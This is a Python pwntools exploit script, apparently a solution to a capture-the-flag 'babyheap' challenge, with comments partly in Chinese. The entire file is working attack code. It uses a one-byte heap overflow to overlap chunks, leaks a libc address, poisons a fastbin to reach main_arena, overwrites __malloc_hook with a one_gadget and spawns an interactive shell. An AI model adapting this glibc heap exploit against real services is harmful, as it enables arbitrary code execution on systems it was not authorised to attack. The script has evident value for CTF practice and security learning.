#coding:utf-8

from pwn import *

context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
context.log_level = 'debug'

# env = {"LD_PRELOAD": "./libc-2.24.so"}
# p = process("./babyheap", env=env)
p = remote("localhost", 1234)
# 本机libc位2.23，所以下面的一些偏移是需要改的

def command(n):
    p.recv()
    p.sendline(str(n))

def alloc(size):
    command(1)
    p.recvuntil("Size: ")
    p.sendline(str(size))

def update(index, size, content):
    command(2)
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)

def delete(index):
    command(3)
    p.recvuntil("Index: ")
    p.sendline(str(index))

def view(index):
    command(4)
    p.recvuntil("Index: ")
    p.sendline(str(index))


raw_input("start! allocate two chunk")
alloc(0x28) # 0
alloc(0x20) # 1
alloc(0x50) # 2
alloc(0x30) # 3
alloc(0x28) # 4
alloc(0x20) # 5
alloc(0x50) # 6
alloc(0x30) # 7
update(0, 0x29, 'b'*0x28+"\x91")

raw_input("then delete first chunk")
delete(1)

alloc(0x20) # 1
view(2)

data = p.recvuntil("\x00").strip("Chunk[2]: ")
top_chunk_addr = leak_addr = u64(data.ljust(8, "\x00"))
malloc_hook_addr = leak_addr - 104
one = malloc_hook_addr - 3951376 + 0x4526a
log.info("malloc_hook # {0}".format(malloc_hook_addr))
log.info("leak_libc # {0}".format(leak_addr))

alloc(0x50) # 8
delete(8)

update(2, 0x18 , p64(0x40+1)+'a'*0x10)
alloc(0x50) # 8  now malloc_arena.fastbinsY = {0,0,0,...,0x41....,0}
# delete(4)

fake_chunk = leak_addr - 56

update(4, 0x29, 'b'*0x28+"\x91")
delete(5)
alloc(0x20) # 5
alloc(0x30) # 9
delete(9)
raw_input("almost get main_arena")
update(6, 8, p64(fake_chunk))

alloc(0x30) # 9
alloc(0x30) # 10 via malloc() get main_arena chunk

update(10, 0x30, "\x00"*0x28+p64(malloc_hook_addr-0x10)) # overwrite top chunk addr

alloc(0x30) # 11
update(11, 8, p64(one)) # overwrite malloc_hook

alloc(0x30)

p.interactive()
